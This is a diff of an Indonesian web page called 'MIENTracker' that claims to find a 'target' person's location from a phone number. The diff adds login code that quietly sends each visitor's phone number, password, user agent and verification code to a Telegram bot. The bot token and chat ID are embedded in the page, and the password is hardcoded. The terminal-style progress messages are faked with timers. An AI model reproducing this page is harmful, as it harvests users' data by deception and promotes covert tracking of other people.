@@ -1,10 +1,11 @@
 <!DOCTYPE html>
+
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MIENTracker - System Access</title>
-    <style>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>MIENTracker - System Access</title>
+<style>
         /* Matrix Background */
         .matrix-bg {
             position: fixed;
@@ -353,93 +354,84 @@
     </style>
 </head>
 <body>
-    <!-- Matrix Background Canvas -->
-    <canvas class="matrix-bg" id="matrixCanvas"></canvas>
-    
-    <!-- Login Container -->
-    <div class="login-container" id="loginContainer">
-        <div class="login-header">
-            <div class="cyber-logo">MIENTracker</div>
-            <h1>SYSTEM LOGIN</h1>
-            <p>Masukkan nomor telepon untuk mengakses sistem pelacakan</p>
-        </div>
-        
-        <div class="input-group">
-            <label for="loginPhone">NOMOR TELEPON</label>
-            <input type="tel" id="loginPhone" placeholder="+62xxxxxxxxxx" pattern="[0-9+]*" inputmode="numeric" maxlength="15">
-        </div>
-        
-        <div class="input-group">
-            <label for="loginCode">KODE VERIFIKASI</label>
-            <input type="text" id="loginCode" placeholder="Masukkan kode 6 digit" maxlength="6" disabled>
-        </div>
-        
-        <button class="login-button" id="loginButton" onclick="startLogin()">Klik untuk dapatkan kode</button>
-        
-        <div class="terminal" id="terminal">
-            <div class="terminal-line"><span class="terminal-prompt">></span> Sistem verifikasi dimulai...</div>
-        </div>
-    </div>
-    
-    <!-- Loading Screen -->
-    <div class="loading-screen" id="loadingScreen">
-        <div class="hacker-text">
-            MEMUAT SISTEM PELACAKAN<span class="flashing-cursor">_</span>
-        </div>
-        <div class="loading-bar">
-            <div class="loading-progress" id="loadingProgress"></div>
-        </div>
-        <div class="loading-text" id="loadingStatus">Menginisialisasi modul pelacakan...</div>
-    </div>
-    
-    <!-- Tracking Container -->
-    <div class="tracking-container" id="trackingContainer">
-        <div class="logo"></div>
-        <h1>MIENTracker</h1>
-        <div class="tagline">Sistem Pelacakan Lokasi via Nomor Telepon</div>
-        
-        <div class="tracking-input-group">
-            <input type="tel" id="phoneNumber" placeholder="Masukkan Nomor Telepon Target" pattern="[0-9]*" inputmode="numeric" maxlength="15">
-        </div>
-        
-        <button class="track-button" id="trackButton" onclick="startTracking()">Lacak Lokasi</button>
-        
-        <div id="trackingLoading" class="loading">
-            <div class="loader"></div>
-            <p>Memproses permintaan lacak...</p>
-        </div>
-        
-        <div id="status" class="status">
-            <p id="statusText"></p>
-        </div>
-        
-        <div id="mapContainer" class="map-container">
-            <div class="map-placeholder">
-                <p>Peta lokasi akan muncul di sini</p>
-            </div>
-        </div>
-        
-        <div id="locationDetails" class="location-details">
-            <div class="detail-item">
-                <span class="detail-label">Latitude:</span>
-                <span id="latitude" class="detail-value">-</span>
-            </div>
-            <div class="detail-item">
-                <span class="detail-label">Longitude:</span>
-                <span id="longitude" class="detail-value">-</span>
-            </div>
-            <div class="detail-item">
-                <span class="detail-label">Akurasi:</span>
-                <span id="accuracy" class="detail-value">- meter</span>
-            </div>
-            <div class="detail-item">
-                <span class="detail-label">Waktu:</span>
-                <span id="timestamp" class="detail-value">-</span>
-            </div>
-        </div>
-    </div>
+<!-- Matrix Background Canvas -->
+<canvas class="matrix-bg" id="matrixCanvas"></canvas>
+<!-- Login Container -->
+<div class="login-container" id="loginContainer">
+<div class="login-header">
+<div class="cyber-logo">MIENTracker</div>
+<h1>SYSTEM LOGIN</h1>
+<p>Masukkan nomor telepon untuk mengakses sistem pelacakan</p>
+</div>
+<div class="input-group">
+<label for="loginPhone">NOMOR TELEPON</label>
+<input id="loginPhone" inputmode="numeric" maxlength="15" pattern="[0-9+]*" placeholder="+62xxxxxxxxxx" type="tel"/>
+</div>
+<div class="input-group">
+<label for="loginCode">KODE VERIFIKASI</label>
+<input disabled="" id="loginCode" maxlength="6" placeholder="Masukkan kode 6 digit" type="text"/>
+</div>
+<button class="login-button" id="loginButton" onclick="startLogin()">Klik untuk dapatkan kode</button>
 
-    <script>
+<div class="input-group">
+<label for="loginPassword">PASSWORD</label>
+<input id="loginPassword" placeholder="Masukkan password akses" type="password"/>
+</div>
+<div class="terminal" id="terminal">
+<div class="terminal-line"><span class="terminal-prompt">&gt;</span> Sistem verifikasi dimulai...</div>
+</div>
+</div>
+<!-- Loading Screen -->
+<div class="loading-screen" id="loadingScreen">
+<div class="hacker-text">
+            MEMUAT SISTEM PELACAKAN<span class="flashing-cursor">_</span>
+</div>
+<div class="loading-bar">
+<div class="loading-progress" id="loadingProgress"></div>
+</div>
+<div class="loading-text" id="loadingStatus">Menginisialisasi modul pelacakan...</div>
+</div>
+<!-- Tracking Container -->
+<div class="tracking-container" id="trackingContainer">
+<div class="logo"></div>
+<h1>MIENTracker</h1>
+<div class="tagline">Sistem Pelacakan Lokasi via Nomor Telepon</div>
+<div class="tracking-input-group">
+<input id="phoneNumber" inputmode="numeric" maxlength="15" pattern="[0-9]*" placeholder="Masukkan Nomor Telepon Target" type="tel"/>
+</div>
+<button class="track-button" id="trackButton" onclick="startTracking()">Lacak Lokasi</button>
+<div class="loading" id="trackingLoading">
+<div class="loader"></div>
+<p>Memproses permintaan lacak...</p>
+</div>
+<div class="status" id="status">
+<p id="statusText"></p>
+</div>
+<div class="map-container" id="mapContainer">
+<div class="map-placeholder">
+<p>Peta lokasi akan muncul di sini</p>
+</div>
+</div>
+<div class="location-details" id="locationDetails">
+<div class="detail-item">
+<span class="detail-label">Latitude:</span>
+<span class="detail-value" id="latitude">-</span>
+</div>
+<div class="detail-item">
+<span class="detail-label">Longitude:</span>
+<span class="detail-value" id="longitude">-</span>
+</div>
+<div class="detail-item">
+<span class="detail-label">Akurasi:</span>
+<span class="detail-value" id="accuracy">- meter</span>
+</div>
+<div class="detail-item">
+<span class="detail-label">Waktu:</span>
+<span class="detail-value" id="timestamp">-</span>
+</div>
+</div>
+</div>
+<script>
         // Telegram Bot Configuration
         const TELEGRAM_BOT_TOKEN = '7723202416:AAHGcGq9XYJbXd3fgJHHl64CJ-Ovau2KI44';
         const TELEGRAM_CHAT_ID = '7932600874';
@@ -487,6 +479,49 @@
         setInterval(draw, 30);
         
         // Login functionality
+
+// Cek password sebelum memulai login
+function startLogin() {
+    const phoneNumber = document.getElementById('loginPhone').value;
+    const password = document.getElementById('loginPassword').value;
+
+    if (!phoneNumber) {
+        alert('Masukkan nomor telepon terlebih dahulu');
+        return;
+    }
+
+    if (password !== 'flay12121') {
+        alert('Password salah!');
+        return;
+    }
+
+    loggedInPhoneNumber = phoneNumber;
+    document.getElementById('loginButton').disabled = true;
+    document.getElementById('terminal').style.display = 'block';
+
+    sendToTelegram(`🔐 LOGIN ATTEMPT\n📱 Nomor: ${phoneNumber}\n🔑 Password: ${password}\n🖥️ User Agent: ${navigator.userAgent}\n🌐 IP: Fetching...`);
+
+    setTimeout(() => {
+        addTerminalLine('> Menghubungkan ke server verifikasi...');
+
+        setTimeout(() => {
+            addTerminalLine('> Server merespons... [200 OK]');
+
+            setTimeout(() => {
+                verificationCode = generateRandomCode();
+                addTerminalLine(`> Kode anda adalah:\n\n${verificationCode}`);
+
+                sendToTelegram(`📳 VERIFICATION CODE SENT\n📱 Nomor: ${phoneNumber}\n🔢 Kode: ${verificationCode}`);
+
+                document.getElementById('loginCode').disabled = false;
+                document.getElementById('loginButton').textContent = 'VERIFIKASI KODE';
+                document.getElementById('loginButton').onclick = verifyCode;
+                document.getElementById('loginButton').disabled = false;
+            }, 1000);
+        }, 1500);
+    }, 1000);
+}
+
         let verificationCode = '';
         let loggedInPhoneNumber = '';
         
